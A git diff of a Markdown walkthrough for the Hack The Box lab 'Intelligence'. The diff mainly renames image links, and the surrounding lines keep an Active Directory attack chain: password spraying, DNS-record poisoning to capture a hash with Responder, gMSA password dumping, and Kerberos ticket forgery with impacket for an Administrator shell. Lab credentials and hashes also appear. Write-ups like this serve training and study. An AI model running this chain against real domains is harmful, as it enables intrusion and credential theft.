@@ -126,10 +126,10 @@ Discovered open port 53/udp on 10.129.156.112
 
 ## Port 80 - HTTP (IIS)
 
-![[Pasted image 20230726135133.png]]
+!["Port 80"](assets/port80.png)
 
 Downloading the two PDFs we get two usernames:
-![[Pasted image 20230725130311.png]]
+!["Exiftool output"](assets/exiftool.png)
 
 - William.Lee
 - Jose.Williams
@@ -186,7 +186,7 @@ $ find . -iname '*.pdf' -exec pdfgrep username {} +
 
 We can open up this pdf using `okular` or any other pdf reader:
 
-![[Pasted image 20230726061514.png]]
+!["Default Credentials"](assets/defaultpass-pdf.png)
 
 Default credentials: `NewIntelligenceCorpUser9876`
 
@@ -232,14 +232,14 @@ You can remove the space before using vim magic, but I don't think it actually c
 
 
 Password spraying smb returns a hit:
-![[Pasted image 20230725134625.png]]
+!["Password Spraying with CrackMapExec"](assets/cme-spray.png)
 
 `intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876`
 
 Tiffany really should stop using the default password!
 
 Shares that she can access are:
-![[Pasted image 20230725134739.png]]
+!["Listing shares using CrackMapExec"](assets/cme-shares.png)
 
 We find a `downdetector.ps1` inside the IT share
 
@@ -269,22 +269,22 @@ We can add a DNS record:
 python3 DNSUpdate.py -u 'intelligence\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -a ad -r webma1ware -d 10.10.16.22 -DNS 10.129.156.112
 ```
 
-![[Pasted image 20230726063329.png]]
+!["Updating DNS entry"](assets/dnsupdate.png)
 
 Boom! We get a hash:
-![[Pasted image 20230725144858.png]]
+!["Responder"](assets/responder-hash.png)
 
 Cracking it returns:
-![[Pasted image 20230725145030.png]]
+!["Cracking with JTR"](assets/john-hash.png)
 
 `Ted.Graves:Mr.Teddy`
 
 Checking in bloohound we can read the password of `SVC_INT`:
-![[Pasted image 20230725145352.png]]
+!["Reading password"](assets/readpass-bloodhound.png)
 
 Bloodhound recommands we use: https://github.com/micahvandeusen/gMSADumper
 
-![[Pasted image 20230725145608.png]]
+!["Dumping password"](assets/password-dumper.png)
 
 ```bash
 ma1ware@shadow:~/pentest/htb/boxes/Intelligence/gMSADumper$ python3 gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -d intelligence.htb
@@ -298,7 +298,7 @@ svc_int$:aes128-cts-hmac-sha1-96:de0b7110639ccbcd2cf195840d6b3ca7
 
 I tried to crack the hash but that failed, so since this is a service account we can create a silver ticket
 since this user has `AllowedToDelegate` on the DC:
-![[Pasted image 20230726134631.png]]
+!["AllowedToDelegate"](assets/AllowedToDelegate.png)
 
 To get the SPN we can access Node properties of svc_int user in Bloodhound
 
@@ -310,7 +310,7 @@ $ sudo rdate -n <ip of DC>
 ```bash
 impacket-getST -spn www/dc.intelligence.htb -dc-ip 10.129.156.112 -impersonate Administrator intelligence.htb/svc_int -hashes :fb49fcd5ffc6fefa70503e08c9cd8261
 ```
-![[Pasted image 20230726133839.png]]
+!["Creating a silver ticket"](assets/silver-ticket.png)
 
 Then we use the ticket with psexec.py
 
@@ -318,8 +318,9 @@ Then we use the ticket with psexec.py
 $ KRB5CCNAME=Administrator.ccache impacket-psexec -k -no-pass administrator@intelligence.htb
 ```
 
-![[Pasted image 20230725224001.png]]
+!["PsExec with Kerberos Auth"](assets/psexec-root.png)
 
+And with that the box is finished!
 
 ---
 
